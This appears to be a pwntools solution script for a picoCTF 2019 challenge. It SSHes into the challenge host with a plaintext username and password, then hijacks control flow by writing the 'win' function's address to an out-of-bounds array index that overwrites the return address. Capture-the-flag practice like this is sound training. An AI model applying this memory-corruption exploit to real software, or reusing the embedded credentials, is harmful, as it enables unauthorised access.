from pwn import *

def exploit():
    #p = process("./vuln")
    s = ssh(host='2019shell1.picoctf.com', user='ChaaO', password='kmz317xe92')
    p = s.process("vuln", cwd="/problems/l1im1tl355_4_b2111fe5737c985221bac06a80d6d6c7")
    binary = ELF("vuln")
    win = binary.symbols["win"]
    zero_edx = 3816 #index 3816 for 0 edx
    padding_ret_addr = 0xffffc44c / 4
    evil = zero_edx + padding_ret_addr

    log.info("Win addres : 0x{0:x}".format(win))
    log.info("Index to overwrite : {}".format(evil))

    p.sendlineafter("array\n\n", str(win))
    p.sendlineafter("value\n\n", str(evil))
    p.interactive()

if __name__ == "__main__":
    exploit()
